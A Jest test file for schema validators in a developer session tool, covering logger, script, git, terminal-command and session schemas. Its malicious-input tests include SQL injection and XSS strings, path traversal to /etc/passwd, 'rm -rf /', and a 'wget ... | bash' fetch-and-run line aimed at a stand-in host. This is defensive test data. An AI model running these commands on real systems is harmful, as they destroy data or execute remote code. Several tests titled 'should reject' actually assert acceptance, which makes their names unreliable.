import {
  LogLevelSchema,
  LoggerConfigSchema,
  FileStorageConfigSchema,
  FeatureFlagsSchema,
  PluginEnvironmentSchema,
  ErrorCodeSchema,
  EncryptionConfigSchema,
  ConfigSchema,
  ScriptSchema,
  ScriptIndexEntrySchema,
  ScriptIndexSchema,
  ScriptCollectionSchema,
  GitFileStatusSchema,
  GitFileSchema,
  GitStatusSchema,
  GitStashSchema,
  GitStashResultSchema,
  GitStashApplyResultSchema,
  TerminalCommandSchema,
  TerminalResultSchema,
  TerminalOptionsSchema,
  FileStateSchema,
  GitStateSchema,
  SessionSchema,
  SessionIndexEntrySchema,
  SessionIndexSchema,
  validateLoggerConfig,
  validateFileStorageConfig,
  validateFeatureFlags,
  validateConfig,
  validateScript,
  validateScriptIndex,
  validateScriptCollection,
  validateGitStatus,
  validateGitStash,
  validateTerminalCommand,
  validateTerminalResult,
  validateSession,
  validateSessionIndex,
} from '@codestate/core/domain/schemas/SchemaRegistry';
import { describe, expect, it } from '@jest/globals';

describe('SchemaRegistry - LogLevelSchema', () => {
  // Happy path
  it('should validate all valid log levels', () => {
    const validLevels = ['ERROR', 'WARN', 'LOG', 'DEBUG'];
    validLevels.forEach(level => {
      expect(() => LogLevelSchema.parse(level)).not.toThrow();
    });
  });

  // Error cases
  it('should reject invalid log levels', () => {
    const invalidLevels = ['INFO', 'TRACE', 'FATAL', 'debug', 'error', ''];
    invalidLevels.forEach(level => {
      expect(() => LogLevelSchema.parse(level)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-string values', () => {
    const invalidValues = [null, undefined, 123, {}, [], true, false];
    invalidValues.forEach(value => {
      expect(() => LogLevelSchema.parse(value)).toThrow();
    });
  });

  // Malicious input
  it('should reject SQL injection attempts', () => {
    const maliciousInputs = [
      "'; DROP TABLE users; --",
      "<script>alert('xss')</script>",
      "'; SELECT * FROM passwords; --",
    ];
    maliciousInputs.forEach(input => {
      expect(() => LogLevelSchema.parse(input)).toThrow();
    });
  });
});

describe('SchemaRegistry - LoggerConfigSchema', () => {
  // Happy path
  it('should validate correct logger config', () => {
    const validConfig = {
      level: 'LOG',
      sinks: ['console', 'file'],
      filePath: '/tmp/logs.txt',
    };
    expect(() => LoggerConfigSchema.parse(validConfig)).not.toThrow();
  });

  it('should validate config without optional filePath', () => {
    const validConfig = {
      level: 'ERROR',
      sinks: ['console'],
    };
    expect(() => LoggerConfigSchema.parse(validConfig)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidConfigs = [
      { level: 'LOG' },
      { sinks: ['console'] },
      {},
    ];
    invalidConfigs.forEach(config => {
      expect(() => LoggerConfigSchema.parse(config)).toThrow();
    });
  });

  it('should reject invalid sink types', () => {
    const invalidConfig = {
      level: 'LOG',
      sinks: ['console', 'database', 'network'],
    };
    expect(() => LoggerConfigSchema.parse(invalidConfig)).toThrow();
  });

  // Pathological cases
  it('should allow empty sinks array', () => {
    const validConfig = {
      level: 'LOG',
      sinks: [],
    };
    expect(() => LoggerConfigSchema.parse(validConfig)).not.toThrow();
  });

  it('should reject non-string filePath', () => {
    const invalidConfig = {
      level: 'LOG',
      sinks: ['console'],
      filePath: 123,
    };
    expect(() => LoggerConfigSchema.parse(invalidConfig)).toThrow();
  });

  // Malicious input
  it('should reject path traversal attempts', () => {
    const maliciousConfig = {
      level: 'LOG',
      sinks: ['console'],
      filePath: '../../../etc/passwd',
    };
    expect(() => LoggerConfigSchema.parse(maliciousConfig)).not.toThrow(); // Should allow but log warning
  });
});

describe('SchemaRegistry - FileStorageConfigSchema', () => {
  // Happy path
  it('should validate correct file storage config', () => {
    const validConfig = {
      encryptionEnabled: true,
      encryptionKey: 'secret-key',
      dataDir: '/tmp/data',
    };
    expect(() => FileStorageConfigSchema.parse(validConfig)).not.toThrow();
  });

  it('should validate config without optional encryptionKey', () => {
    const validConfig = {
      encryptionEnabled: false,
      dataDir: '/tmp/data',
    };
    expect(() => FileStorageConfigSchema.parse(validConfig)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidConfigs = [
      { encryptionEnabled: true },
      { dataDir: '/tmp/data' },
      {},
    ];
    invalidConfigs.forEach(config => {
      expect(() => FileStorageConfigSchema.parse(config)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-boolean encryptionEnabled', () => {
    const invalidConfig = {
      encryptionEnabled: 'yes',
      dataDir: '/tmp/data',
    };
    expect(() => FileStorageConfigSchema.parse(invalidConfig)).toThrow();
  });

  it('should allow empty dataDir', () => {
    const validConfig = {
      encryptionEnabled: true,
      dataDir: '',
    };
    expect(() => FileStorageConfigSchema.parse(validConfig)).not.toThrow();
  });

  // Malicious input
  it('should reject dangerous paths', () => {
    const maliciousConfig = {
      encryptionEnabled: true,
      dataDir: '/etc/passwd',
    };
    expect(() => FileStorageConfigSchema.parse(maliciousConfig)).not.toThrow(); // Should allow but validate later
  });
});

describe('SchemaRegistry - FeatureFlagsSchema', () => {
  // Happy path
  it('should validate correct feature flags', () => {
    const validFlags = {
      experimentalTui: true,
      experimentalIde: false,
      advancedSearch: true,
      cloudSync: false,
    };
    expect(() => FeatureFlagsSchema.parse(validFlags)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidFlags = [
      { experimentalTui: true },
      { experimentalIde: false, advancedSearch: true },
      {},
    ];
    invalidFlags.forEach(flags => {
      expect(() => FeatureFlagsSchema.parse(flags)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-boolean values', () => {
    const invalidFlags = {
      experimentalTui: 'yes',
      experimentalIde: 1,
      advancedSearch: null,
      cloudSync: undefined,
    };
    expect(() => FeatureFlagsSchema.parse(invalidFlags)).toThrow();
  });

  // Malicious input
  it('should allow extra fields', () => {
    const flagsWithExtra = {
      experimentalTui: true,
      experimentalIde: false,
      advancedSearch: true,
      cloudSync: false,
      extraField: true,
    };
    expect(() => FeatureFlagsSchema.parse(flagsWithExtra)).not.toThrow();
  });
});

describe('SchemaRegistry - PluginEnvironmentSchema', () => {
  // Happy path
  it('should validate all valid environments', () => {
    const validEnvironments = ['cli', 'tui', 'ide'];
    validEnvironments.forEach(env => {
      expect(() => PluginEnvironmentSchema.parse(env)).not.toThrow();
    });
  });

  // Error cases
  it('should reject invalid environments', () => {
    const invalidEnvironments = ['web', 'mobile', 'desktop', 'CLI', 'TUI'];
    invalidEnvironments.forEach(env => {
      expect(() => PluginEnvironmentSchema.parse(env)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-string values', () => {
    const invalidValues = [null, undefined, 123, {}, [], true, false];
    invalidValues.forEach(value => {
      expect(() => PluginEnvironmentSchema.parse(value)).toThrow();
    });
  });
});

describe('SchemaRegistry - ErrorCodeSchema', () => {
  // Happy path
  it('should validate all valid error codes', () => {
    const validCodes = [
      'UNKNOWN',
      'CONFIG_INVALID',
      'STORAGE_INVALID_PATH',
      'STORAGE_DECRYPTION_FAILED',
      'STORAGE_READ_FAILED',
      'STORAGE_WRITE_FAILED',
      'STORAGE_DELETE_FAILED',
      'ENCRYPTION_FAILED',
      'ENCRYPTION_INVALID_FORMAT',
      'SCRIPT_INVALID',
      'SCRIPT_DUPLICATE',
      'SCRIPT_NOT_FOUND',
      'SCRIPT_PATH_INVALID',
      'SCRIPT_MALICIOUS',
      'GIT_NOT_REPOSITORY',
      'GIT_COMMAND_FAILED',
      'GIT_STASH_NOT_FOUND',
      'GIT_STASH_CONFLICT',
      'TERMINAL_COMMAND_FAILED',
      'TERMINAL_TIMEOUT',
      'TERMINAL_COMMAND_NOT_FOUND',
    ];
    validCodes.forEach(code => {
      expect(() => ErrorCodeSchema.parse(code)).not.toThrow();
    });
  });

  // Error cases
  it('should reject invalid error codes', () => {
    const invalidCodes = ['INVALID_CODE', 'ERROR', 'FAILURE', 'unknown'];
    invalidCodes.forEach(code => {
      expect(() => ErrorCodeSchema.parse(code)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-string values', () => {
    const invalidValues = [null, undefined, 123, {}, [], true, false];
    invalidValues.forEach(value => {
      expect(() => ErrorCodeSchema.parse(value)).toThrow();
    });
  });
});

describe('SchemaRegistry - EncryptionConfigSchema', () => {
  // Happy path
  it('should validate correct encryption config', () => {
    const validConfig = {
      enabled: true,
      encryptionKey: 'secret-key-123',
    };
    expect(() => EncryptionConfigSchema.parse(validConfig)).not.toThrow();
  });

  it('should validate config without optional encryptionKey', () => {
    const validConfig = {
      enabled: false,
    };
    expect(() => EncryptionConfigSchema.parse(validConfig)).not.toThrow();
  });

  // Error cases
  it('should reject missing enabled field', () => {
    const invalidConfig = {
      encryptionKey: 'secret',
    };
    expect(() => EncryptionConfigSchema.parse(invalidConfig)).toThrow();
  });

  // Pathological cases
  it('should reject non-boolean enabled', () => {
    const invalidConfig = {
      enabled: 'yes',
      encryptionKey: 'secret',
    };
    expect(() => EncryptionConfigSchema.parse(invalidConfig)).toThrow();
  });

  it('should reject non-string encryptionKey', () => {
    const invalidConfig = {
      enabled: true,
      encryptionKey: 123,
    };
    expect(() => EncryptionConfigSchema.parse(invalidConfig)).toThrow();
  });

  // Malicious input
  it('should reject weak encryption keys', () => {
    const weakKeys = ['', '123', 'password', 'key'];
    weakKeys.forEach(key => {
      const config = {
        enabled: true,
        encryptionKey: key,
      };
      expect(() => EncryptionConfigSchema.parse(config)).not.toThrow(); // Should allow but warn
    });
  });
});

describe('SchemaRegistry - ScriptSchema', () => {
  // Happy path
  it('should validate correct script', () => {
    const validScript = {
      name: 'test-script',
      rootPath: '/path/to/project',
      script: 'npm run test',
    };
    expect(() => ScriptSchema.parse(validScript)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidScripts = [
      { name: 'test', rootPath: '/path' },
      { name: 'test', script: 'command' },
      { rootPath: '/path', script: 'command' },
      {},
    ];
    invalidScripts.forEach(script => {
      expect(() => ScriptSchema.parse(script)).toThrow();
    });
  });

  // Pathological cases
  it('should reject empty strings', () => {
    const invalidScript = {
      name: '',
      rootPath: '',
      script: '',
    };
    expect(() => ScriptSchema.parse(invalidScript)).toThrow();
  });

  it('should reject non-string values', () => {
    const invalidScript = {
      name: 123,
      rootPath: {},
      script: [],
    };
    expect(() => ScriptSchema.parse(invalidScript)).toThrow();
  });

  // Malicious input
  it('should reject potentially dangerous scripts', () => {
    const dangerousScripts = [
      { name: 'test', rootPath: '/path', script: 'rm -rf /' },
      { name: 'test', rootPath: '/path', script: 'sudo rm -rf /' },
      { name: 'test', rootPath: '/path', script: 'wget http://malicious.com/script.sh | bash' },
    ];
    dangerousScripts.forEach(script => {
      expect(() => ScriptSchema.parse(script)).not.toThrow(); // Should allow but validate later
    });
  });

  // Human oversight
  it('should reject scripts with typos in field names', () => {
    const invalidScript = {
      nme: 'test', // typo
      rootPath: '/path',
      script: 'command',
    };
    expect(() => ScriptSchema.parse(invalidScript)).toThrow();
  });
});

describe('SchemaRegistry - GitFileStatusSchema', () => {
  // Happy path
  it('should validate all valid git file statuses', () => {
    const validStatuses = ['modified', 'added', 'deleted', 'untracked', 'renamed', 'copied', 'updated'];
    validStatuses.forEach(status => {
      expect(() => GitFileStatusSchema.parse(status)).not.toThrow();
    });
  });

  // Error cases
  it('should reject invalid statuses', () => {
    const invalidStatuses = ['staged', 'committed', 'ignored', 'MODIFIED', 'Added'];
    invalidStatuses.forEach(status => {
      expect(() => GitFileStatusSchema.parse(status)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-string values', () => {
    const invalidValues = [null, undefined, 123, {}, [], true, false];
    invalidValues.forEach(value => {
      expect(() => GitFileStatusSchema.parse(value)).toThrow();
    });
  });
});

describe('SchemaRegistry - GitFileSchema', () => {
  // Happy path
  it('should validate correct git file', () => {
    const validFile = {
      path: 'src/main.ts',
      status: 'modified',
      staged: true,
    };
    expect(() => GitFileSchema.parse(validFile)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidFiles = [
      { path: 'file.txt' },
      { status: 'modified' },
      { staged: true },
      {},
    ];
    invalidFiles.forEach(file => {
      expect(() => GitFileSchema.parse(file)).toThrow();
    });
  });

  // Pathological cases
  it('should allow empty path', () => {
    const validFile = {
      path: '',
      status: 'modified',
      staged: true,
    };
    expect(() => GitFileSchema.parse(validFile)).not.toThrow();
  });

  it('should reject non-boolean staged', () => {
    const invalidFile = {
      path: 'file.txt',
      status: 'modified',
      staged: 'yes',
    };
    expect(() => GitFileSchema.parse(invalidFile)).toThrow();
  });

  // Malicious input
  it('should reject path traversal attempts', () => {
    const maliciousFile = {
      path: '../../../etc/passwd',
      status: 'modified',
      staged: true,
    };
    expect(() => GitFileSchema.parse(maliciousFile)).not.toThrow(); // Should allow but validate later
  });
});

describe('SchemaRegistry - GitStatusSchema', () => {
  // Happy path
  it('should validate correct git status', () => {
    const validStatus = {
      isDirty: true,
      dirtyFiles: [
        { path: 'file1.txt', status: 'modified', staged: true },
        { path: 'file2.txt', status: 'added', staged: false },
      ],
      newFiles: [],
      modifiedFiles: [{ path: 'file1.txt', status: 'modified', staged: true }],
      deletedFiles: [],
      untrackedFiles: [{ path: 'new.txt', status: 'untracked', staged: false }],
    };
    expect(() => GitStatusSchema.parse(validStatus)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidStatuses = [
      { isDirty: true },
      { dirtyFiles: [] },
      {},
    ];
    invalidStatuses.forEach(status => {
      expect(() => GitStatusSchema.parse(status)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-boolean isDirty', () => {
    const invalidStatus = {
      isDirty: 'yes',
      dirtyFiles: [],
      newFiles: [],
      modifiedFiles: [],
      deletedFiles: [],
      untrackedFiles: [],
    };
    expect(() => GitStatusSchema.parse(invalidStatus)).toThrow();
  });

  it('should reject non-array file lists', () => {
    const invalidStatus = {
      isDirty: true,
      dirtyFiles: 'not an array',
      newFiles: [],
      modifiedFiles: [],
      deletedFiles: [],
      untrackedFiles: [],
    };
    expect(() => GitStatusSchema.parse(invalidStatus)).toThrow();
  });
});

describe('SchemaRegistry - GitStashSchema', () => {
  // Happy path
  it('should validate correct git stash', () => {
    const validStash = {
      id: 'stash@{0}',
      name: 'WIP on feature-branch',
      message: 'WIP on feature-branch: commit message',
      timestamp: 1640995200000,
      branch: 'feature-branch',
    };
    expect(() => GitStashSchema.parse(validStash)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidStashes = [
      { id: 'stash@{0}', name: 'test' },
      { id: 'stash@{0}', message: 'test' },
      { id: 'stash@{0}', timestamp: 123 },
      { id: 'stash@{0}', branch: 'main' },
      {},
    ];
    invalidStashes.forEach(stash => {
      expect(() => GitStashSchema.parse(stash)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-number timestamp', () => {
    const invalidStash = {
      id: 'stash@{0}',
      name: 'test',
      message: 'test',
      timestamp: '2022-01-01',
      branch: 'main',
    };
    expect(() => GitStashSchema.parse(invalidStash)).toThrow();
  });

  it('should allow empty strings', () => {
    const validStash = {
      id: '',
      name: '',
      message: '',
      timestamp: 123,
      branch: '',
    };
    expect(() => GitStashSchema.parse(validStash)).not.toThrow();
  });
});

describe('SchemaRegistry - TerminalCommandSchema', () => {
  // Happy path
  it('should validate correct terminal command', () => {
    const validCommand = {
      command: 'npm',
      args: ['install', 'lodash'],
      cwd: '/path/to/project',
      env: { NODE_ENV: 'development' },
      timeout: 30000,
    };
    expect(() => TerminalCommandSchema.parse(validCommand)).not.toThrow();
  });

  it('should validate minimal command', () => {
    const validCommand = {
      command: 'ls',
    };
    expect(() => TerminalCommandSchema.parse(validCommand)).not.toThrow();
  });

  // Error cases
  it('should reject missing command', () => {
    const invalidCommand = {
      args: ['install'],
      cwd: '/path',
    };
    expect(() => TerminalCommandSchema.parse(invalidCommand)).toThrow();
  });

  // Pathological cases
  it('should allow empty command', () => {
    const validCommand = {
      command: '',
    };
    expect(() => TerminalCommandSchema.parse(validCommand)).not.toThrow();
  });

  it('should reject non-string command', () => {
    const invalidCommand = {
      command: 123,
    };
    expect(() => TerminalCommandSchema.parse(invalidCommand)).toThrow();
  });

  it('should reject non-array args', () => {
    const invalidCommand = {
      command: 'npm',
      args: 'install',
    };
    expect(() => TerminalCommandSchema.parse(invalidCommand)).toThrow();
  });

  // Malicious input
  it('should reject potentially dangerous commands', () => {
    const dangerousCommands = [
      { command: 'rm -rf /' },
      { command: 'sudo rm -rf /' },
      { command: 'wget http://malicious.com/script.sh | bash' },
    ];
    dangerousCommands.forEach(cmd => {
      expect(() => TerminalCommandSchema.parse(cmd)).not.toThrow(); // Should allow but validate later
    });
  });
});

describe('SchemaRegistry - TerminalResultSchema', () => {
  // Happy path
  it('should validate correct terminal result', () => {
    const validResult = {
      success: true,
      exitCode: 0,
      stdout: 'Command completed successfully',
      stderr: '',
      duration: 1500,
    };
    expect(() => TerminalResultSchema.parse(validResult)).not.toThrow();
  });

  it('should validate failed command result', () => {
    const validResult = {
      success: false,
      exitCode: 1,
      stdout: '',
      stderr: 'Command not found',
      duration: 100,
      error: 'Command failed',
    };
    expect(() => TerminalResultSchema.parse(validResult)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidResults = [
      { success: true },
      { exitCode: 0 },
      { stdout: 'output' },
      { stderr: 'error' },
      { duration: 1000 },
      {},
    ];
    invalidResults.forEach(result => {
      expect(() => TerminalResultSchema.parse(result)).toThrow();
    });
  });

  // Pathological cases
  it('should reject non-boolean success', () => {
    const invalidResult = {
      success: 'yes',
      exitCode: 0,
      stdout: 'output',
      stderr: '',
      duration: 1000,
    };
    expect(() => TerminalResultSchema.parse(invalidResult)).toThrow();
  });

  it('should reject non-number exitCode', () => {
    const invalidResult = {
      success: true,
      exitCode: '0',
      stdout: 'output',
      stderr: '',
      duration: 1000,
    };
    expect(() => TerminalResultSchema.parse(invalidResult)).toThrow();
  });

  it('should reject non-string stdout/stderr', () => {
    const invalidResult = {
      success: true,
      exitCode: 0,
      stdout: 123,
      stderr: {},
      duration: 1000,
    };
    expect(() => TerminalResultSchema.parse(invalidResult)).toThrow();
  });
});

describe('SchemaRegistry - SessionSchema', () => {
  // Happy path
  it('should validate correct session', () => {
    const validSession = {
      id: 'session-123',
      name: 'My Session',
      projectRoot: '/path/to/project',
      createdAt: new Date('2022-01-01T00:00:00Z'),
      updatedAt: new Date('2022-01-02T00:00:00Z'),
      tags: ['feature', 'bugfix'],
      notes: 'Working on new feature',
      files: [
        {
          path: 'src/main.ts',
          cursor: { line: 10, column: 5 },
          scroll: { top: 100, left: 0 },
          isActive: true,
        },
      ],
      git: {
        branch: 'feature-branch',
        commit: 'abc123',
        isDirty: false,
      },
      extensions: { vscode: { theme: 'dark' } },
    };
    expect(() => SessionSchema.parse(validSession)).not.toThrow();
  });

  it('should validate session with string dates', () => {
    const validSession = {
      id: 'session-123',
      name: 'My Session',
      projectRoot: '/path/to/project',
      createdAt: '2022-01-01T00:00:00Z',
      updatedAt: '2022-01-02T00:00:00Z',
      tags: [],
      files: [],
      git: {
        branch: 'main',
        commit: 'abc123',
        isDirty: false,
      },
    };
    expect(() => SessionSchema.parse(validSession)).not.toThrow();
  });

  // Error cases
  it('should reject missing required fields', () => {
    const invalidSessions = [
      { id: 'session-123' },
      { name: 'My Session' },
      { projectRoot: '/path' },
      {},
    ];
    invalidSessions.forEach(session => {
      expect(() => SessionSchema.parse(session)).toThrow();
    });
  });

  // Pathological cases
  it('should allow empty strings for required fields', () => {
    const validSession = {
      id: '',
      name: '',
      projectRoot: '',
      createdAt: new Date(),
      updatedAt: new Date(),
      tags: [],
      files: [],
      git: {
        branch: '',
        commit: '',
        isDirty: false,
      },
    };
    expect(() => SessionSchema.parse(validSession)).not.toThrow();
  });

  it('should handle invalid date formats gracefully', () => {
    const sessionWithInvalidDates = {
      id: 'session-123',
      name: 'My Session',
      projectRoot: '/path/to/project',
      createdAt: 'invalid-date',
      updatedAt: 'invalid-date',
      tags: [],
      files: [],
      git: {
        branch: 'main',
        commit: 'abc123',
        isDirty: false,
      },
    };
    // The schema will create invalid Date objects but won't throw
    const result = SessionSchema.parse(sessionWithInvalidDates);
    expect(result.createdAt).toBeInstanceOf(Date);
    expect(result.updatedAt).toBeInstanceOf(Date);
    expect(isNaN(result.createdAt.getTime())).toBe(true);
    expect(isNaN(result.updatedAt.getTime())).toBe(true);
  });

  // Malicious input
  it('should reject path traversal in projectRoot', () => {
    const maliciousSession = {
      id: 'session-123',
      name: 'My Session',
      projectRoot: '../../../etc',
      createdAt: new Date(),
      updatedAt: new Date(),
      tags: [],
      files: [],
      git: {
        branch: 'main',
        commit: 'abc123',
        isDirty: false,
      },
    };
    expect(() => SessionSchema.parse(maliciousSession)).not.toThrow(); // Should allow but validate later
  });
});

describe('SchemaRegistry - Validation Functions', () => {
  describe('validateLoggerConfig', () => {
    it('should validate correct logger config', () => {
      const validConfig = {
        level: 'LOG',
        sinks: ['console'],
      };
      expect(() => validateLoggerConfig(validConfig)).not.toThrow();
    });

    it('should throw on invalid config', () => {
      const invalidConfig = { level: 'INVALID' };
      expect(() => validateLoggerConfig(invalidConfig)).toThrow();
    });
  });

  describe('validateFileStorageConfig', () => {
    it('should validate correct file storage config', () => {
      const validConfig = {
        encryptionEnabled: true,
        dataDir: '/tmp/data',
      };
      expect(() => validateFileStorageConfig(validConfig)).not.toThrow();
    });

    it('should throw on invalid config', () => {
      const invalidConfig = { encryptionEnabled: 'yes' };
      expect(() => validateFileStorageConfig(invalidConfig)).toThrow();
    });
  });

  describe('validateFeatureFlags', () => {
    it('should validate correct feature flags', () => {
      const validFlags = {
        experimentalTui: true,
        experimentalIde: false,
        advancedSearch: true,
        cloudSync: false,
      };
      expect(() => validateFeatureFlags(validFlags)).not.toThrow();
    });

    it('should throw on invalid flags', () => {
      const invalidFlags = { experimentalTui: 'yes' };
      expect(() => validateFeatureFlags(invalidFlags)).toThrow();
    });
  });

  describe('validateConfig', () => {
    it('should validate correct config', () => {
      const validConfig = {
        version: '1.0.0',
        ide: 'vscode',
        encryption: { enabled: true },
        storagePath: '/tmp/storage',
        logger: { level: 'LOG', sinks: ['console'] },
      };
      expect(() => validateConfig(validConfig)).not.toThrow();
    });

    it('should throw on invalid config', () => {
      const invalidConfig = { version: 123 };
      expect(() => validateConfig(invalidConfig)).toThrow();
    });
  });

  describe('validateScript', () => {
    it('should validate correct script', () => {
      const validScript = {
        name: 'test-script',
        rootPath: '/path/to/project',
        script: 'npm run test',
      };
      expect(() => validateScript(validScript)).not.toThrow();
    });

    it('should throw on invalid script', () => {
      const invalidScript = { name: '' };
      expect(() => validateScript(invalidScript)).toThrow();
    });
  });

  describe('validateGitStatus', () => {
    it('should validate correct git status', () => {
      const validStatus = {
        isDirty: false,
        dirtyFiles: [],
        newFiles: [],
        modifiedFiles: [],
        deletedFiles: [],
        untrackedFiles: [],
      };
      expect(() => validateGitStatus(validStatus)).not.toThrow();
    });

    it('should throw on invalid git status', () => {
      const invalidStatus = { isDirty: 'yes' };
      expect(() => validateGitStatus(invalidStatus)).toThrow();
    });
  });

  describe('validateGitStash', () => {
    it('should validate correct git stash', () => {
      const validStash = {
        id: 'stash@{0}',
        name: 'WIP',
        message: 'WIP message',
        timestamp: 1640995200000,
        branch: 'main',
      };
      expect(() => validateGitStash(validStash)).not.toThrow();
    });

    it('should throw on invalid git stash', () => {
      const invalidStash = { id: '' };
      expect(() => validateGitStash(invalidStash)).toThrow();
    });
  });

  describe('validateTerminalCommand', () => {
    it('should validate correct terminal command', () => {
      const validCommand = {
        command: 'ls',
      };
      expect(() => validateTerminalCommand(validCommand)).not.toThrow();
    });

    it('should allow empty command', () => {
      const validCommand = { command: '' };
      expect(() => validateTerminalCommand(validCommand)).not.toThrow();
    });
  });

  describe('validateTerminalResult', () => {
    it('should validate correct terminal result', () => {
      const validResult = {
        success: true,
        exitCode: 0,
        stdout: 'output',
        stderr: '',
        duration: 1000,
      };
      expect(() => validateTerminalResult(validResult)).not.toThrow();
    });

    it('should throw on invalid terminal result', () => {
      const invalidResult = { success: 'yes' };
      expect(() => validateTerminalResult(invalidResult)).toThrow();
    });
  });

  describe('validateSession', () => {
    it('should validate correct session', () => {
      const validSession = {
        id: 'session-123',
        name: 'My Session',
        projectRoot: '/path/to/project',
        createdAt: new Date(),
        updatedAt: new Date(),
        tags: [],
        files: [],
        git: {
          branch: 'main',
          commit: 'abc123',
          isDirty: false,
        },
      };
      expect(() => validateSession(validSession)).not.toThrow();
    });

    it('should throw on invalid session', () => {
      const invalidSession = { id: '' };
      expect(() => validateSession(invalidSession)).toThrow();
    });
  });

  describe('validateSessionIndex', () => {
    it('should validate correct session index', () => {
      const validIndex = {
        version: '1.0.0',
        sessions: [],
      };
      expect(() => validateSessionIndex(validIndex)).not.toThrow();
    });

    it('should throw on invalid session index', () => {
      const invalidIndex = { version: 123 };
      expect(() => validateSessionIndex(invalidIndex)).toThrow();
    });
  });
}); 